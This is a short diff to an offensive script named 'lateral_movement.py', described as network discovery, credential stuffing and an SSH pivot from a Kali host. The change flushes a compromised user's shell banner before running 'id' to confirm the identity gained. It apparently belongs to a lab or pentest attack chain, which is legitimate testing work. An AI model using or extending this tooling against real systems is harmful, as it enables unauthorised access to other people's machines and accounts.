@@ -4,7 +4,7 @@ import socket
 import threading
 import time
 
-from chainlog import log, run_remote, send_command
+from chainlog import drain, log, run_remote, send_command
 
 # =============================================================================
 # lateral_movement.py — Network Discovery + Credential Stuffing + SSH Pivot
@@ -238,6 +238,7 @@ def run(root_shell, kali_host=KALI_HOST, workstation_ip=WORKSTATION_IP,
     # Phase 4 — Confirm identity
     # ------------------------------------------------------------------
     time.sleep(1)
+    drain(john_shell, timeout=2.0)  # flush shell banner before first sentinel-based command
     response = run_remote(john_shell, "id", timeout=10)
 
     if workstation_user in response:
